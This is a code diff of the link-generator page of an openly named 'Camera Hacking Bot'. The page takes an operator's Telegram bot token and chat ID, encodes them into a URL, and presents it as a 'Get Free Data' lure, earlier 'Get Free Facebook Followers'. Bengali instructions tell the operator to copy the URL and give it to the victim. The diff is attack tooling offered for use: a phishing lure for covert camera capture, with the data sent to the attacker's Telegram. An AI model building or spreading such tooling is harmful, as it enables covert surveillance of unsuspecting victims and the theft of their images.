@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Hacking Bot</title>
+    <title>Camera Hacking Bot</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -100,9 +100,10 @@
 </head>
 <body>
     <div class="container">
-        <div class="header">Location Hacking Bot</div>
+        <div class="header">Camera Hacking Bot</div>
         <input type="text" id="telegramToken" placeholder="Enter Telegram Token">
         <input type="text" id="chatId" placeholder="Enter Chat ID">
+        <p style="font-family: 'Arial', sans-serif; color: #ff6708;">Note: এখানে Bot_token এবং chat_id ইনপুট করুন এবং জেনারেট এ ক্লিক করুন।</p>
         <button onclick="generateLink()">Generate</button>
         <div class="generated-link" id="generatedLink"></div>
         <div class="note">Developed by Rnasaks</div>
@@ -119,10 +120,10 @@
             }
 
             const encodedParams = btoa(`token=${telegramToken}&chatId=${chatId}`);
-            const link = `get-followers.html?data=${encodedParams}`;
+            const link = `get-free-data.html?data=${encodedParams}`;
 
             const generatedLinkElement = document.getElementById('generatedLink');
-            generatedLinkElement.innerHTML = `<a href="${link}" target="_blank">Get Free Facebook Followers</a>`;
+            generatedLinkElement.innerHTML = `<a href="${link}" target="_blank">Get Free Data</a><br> <span style="color: red;">লিংকে ক্লিক করুন এবং ইউআরএল কপি করে ভিকটিম কে দিয়ে দেন।</span>`;
         }
     </script>
 </body>
